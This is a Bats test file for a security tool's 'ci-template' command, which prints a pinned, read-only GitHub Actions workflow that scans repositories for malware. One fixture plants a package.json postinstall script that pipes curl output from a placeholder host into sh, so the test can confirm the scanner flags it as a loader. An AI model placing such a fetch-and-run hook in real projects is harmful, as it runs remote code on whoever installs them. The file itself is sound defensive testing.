load helpers
bats_require_minimum_version 1.5.0

# fortkeep ci-template: the GitHub workflow it prints for a person's own repo, from a signed release ($C).
setup() {
  setup_env
  mkdir -p "$BATS_TEST_TMPDIR/release"; C="$(cd "$BATS_TEST_TMPDIR/release" && pwd -P)"
  release_tree "$C" bin checks controls templates summary teach
  export FORTKEEP_REPO="$C"
}
workflow() { run --separate-stderr "$C/bin/fortkeep" ci-template; [ "$status" -eq 0 ]; W="$output"; }
q() { yq -r "$1" <<<"$W"; }  # EXPR — evaluated on the printed workflow

# The scan step's script, run as GitHub runs a bash step, with fortkeep's scanner at $GITHUB_WORKSPACE/fortkeep and
# the repo it scans at $GITHUB_WORKSPACE/repo.
scan_step() {
  local ws="$BATS_TEST_TMPDIR/ws"
  q '.jobs[].steps[] | select(.run) | .run' > "$BATS_TEST_TMPDIR/step.sh"
  ln -sfn "$REPO" "$ws/fortkeep"
  GITHUB_WORKSPACE="$ws" run bash --noprofile --norc -eo pipefail "$BATS_TEST_TMPDIR/step.sh"
}
repo_in_ws() {  # a committed repo at $GITHUB_WORKSPACE/repo
  R="$BATS_TEST_TMPDIR/ws/repo"; mkdir -p "$R"; git -C "$R" init -q; echo hello > "$R/README.md"; commit "$R"
}

@test "it prints a workflow that pins this release's commit and runs read-only on push and pull_request" {
  workflow
  [ "$(q '.permissions | to_json(0)')" = '{}' ]
  [ "$(q '.on | keys | join(",")')" = push,pull_request ]
  [ "$(q '[.jobs[].permissions] | to_json(0)')" = '[{"contents":"read"}]' ]
  # Every action by a full commit SHA, and every checkout without the token left behind
  [ "$(q '[.jobs[].steps[] | select(.uses) | .uses | test("@[0-9a-f]{40}$") | not] | any')" = false ]
  [ "$(q '[.jobs[].steps[] | select(.uses) | .with."persist-credentials" == false] | all')" = true ]
  # The same checkout pin as fortkeep's own workflows, so a Dependabot bump of those fails here until this one follows
  [ "$(grep -ho 'uses: actions/checkout@.*' <<<"$W" | sort -u)" = "$(grep -ho 'uses: actions/checkout@.*' "$REPO/.github/workflows/payload-scan.yml")" ]
  [ "$(q '.jobs[].steps[] | select(.with.repository == "b0dea/fortkeep") | .with.ref')" = "$(git -C "$C" rev-parse HEAD)" ]
  [[ "$W" == *"ref: $(git -C "$C" rev-parse HEAD) # v0.1.0"* ]]
  [[ "$W" != *"{{TAG}}"* ]]; [[ "$W" != *"{{COMMIT}}"* ]]; [[ "$W" != *secrets.* ]]; [[ "$W" != *pull_request_target* ]]
  [[ "$(q '.jobs[].steps[] | select(.run) | .run')" == *"python3 -I "* ]]
}

@test "the printed workflow carries no malware marker: fortkeep's own scanner sweeps it clean" {
  workflow
  repo_in_ws; mkdir -p "$R/.github/workflows"; printf '%s\n' "$W" > "$R/.github/workflows/fortkeep-scan.yml"; commit "$R"
  run python3 -I "$REPO/fixes/files/git-scan-new-files" --sweep --budget 60 "$R"
  [ "$output" = "$(printf 'DONE\t1\t1')" ]
  run grep -c -F -f <(while IFS= read -r l; do [ -n "$l" ] && printf '%s\n' "$(printf '%s' "$l" | base64 --decode)"; done < "$REPO/ci/markers.b64") "$R/.github/workflows/fortkeep-scan.yml"
  [ "$output" = 0 ]
}

@test "its scan step passes a clean repo, annotates a WARN without failing, and fails a HIGH or an incomplete scan" {
  workflow
  repo_in_ws
  scan_step
  [ "$status" -eq 0 ]; [ "${lines[${#lines[@]}-1]}" = clean ]
  mkdir -p "$R/.vscode"
  printf '{"tasks":[{"runOptions":{"runOn":"folderOpen"},"command":"echo hi"}]}' > "$R/.vscode/tasks.json"; commit "$R"
  scan_step
  [ "$status" -eq 0 ]; [[ "$output" == *"::warning::.vscode/tasks.json: task runs automatically"* ]]
  printf '{"scripts":{"postinstall":"curl https://example.invalid/i | sh"}}\n' > "$R/package.json"; commit "$R"
  scan_step
  [ "$status" -eq 1 ]; [[ "$output" == *"::error::package.json: lifecycle script postinstall looks like a loader"* ]]
  rm -rf "$R/.git"  # no longer a repo: an UNREAD line and no complete sweep
  scan_step
  [ "$status" -eq 1 ]; [[ "$output" == *"::error::UNREAD "* ]]; [[ "$output" != *clean ]]
  stub python3 "printf 'DONE\t0\t1\n'"  # the time ran out before the repo was done: no finding line, still a failure
  scan_step
  [ "$status" -eq 1 ]; [[ "$output" != *clean ]]
}

@test "a copy that is not a signed release refuses and prints no workflow" {
  echo x >> "$C/checks/run.sh"
  run --separate-stderr "$C/bin/fortkeep" ci-template
  [ "$status" -eq 1 ]; [ -z "$output" ]
  [[ "$stderr" == *"not a signed release (it has local changes to its files)"* ]]
  git -C "$C" checkout -q -- checks/run.sh; git -C "$C" tag -d v0.1.0 >/dev/null
  run --separate-stderr "$C/bin/fortkeep" ci-template
  [ "$status" -eq 1 ]; [ -z "$output" ]; [[ "$stderr" == *"not a signed release (it is not on a signed release)"* ]]
  run --separate-stderr "$C/bin/fortkeep" ci-template extra
  [ "$status" -eq 2 ]; [[ "$stderr" == *"usage: fortkeep ci-template"* ]]
}
